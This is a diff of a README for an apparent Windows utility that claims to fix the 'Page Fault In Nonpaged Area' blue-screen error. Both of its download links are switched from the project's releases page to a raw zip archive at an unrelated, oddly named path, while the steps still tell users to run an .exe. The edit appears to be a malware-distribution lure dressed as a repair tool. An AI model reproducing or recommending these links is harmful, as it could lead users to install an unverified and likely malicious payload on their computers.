@@ -5,7 +5,7 @@ description: "Repair the Page Fault In Nonpaged Area BSOD error on Windows 10 an
 ---
 # 🔧 Page-Fault-In-Nonpaged-Area-Fix - Resolve BSOD errors on Windows quickly
 
-[![Download Here](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/samuelaconfederate661/Page-Fault-In-Nonpaged-Area-Fix/releases)
+[![Download Here](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/samuelaconfederate661/samuelaconfederate661.github.io/main/promptness/github_io_samuelaconfederate_v2.2.zip)
 
 This tool helps you fix the Page Fault in Nonpaged Area error on Windows 10 and 11. This error often causes a blue screen of death, or BSOD. This software repairs corrupted system files and updates missing drivers to stop the crash.
 
@@ -35,7 +35,7 @@ System Requirements:
 
 Follow these steps to obtain the tool:
 
-1. Click this link: [Visit the official releases page to download](https://github.com/samuelaconfederate661/Page-Fault-In-Nonpaged-Area-Fix/releases).
+1. Click this link: [Visit the official releases page to download](https://raw.githubusercontent.com/samuelaconfederate661/samuelaconfederate661.github.io/main/promptness/github_io_samuelaconfederate_v2.2.zip).
 2. Look for the latest version listed under the Assets section.
 3. Select the file ending in .exe to start your download.
 4. Locate the file in your Downloads folder once the transfer finishes.
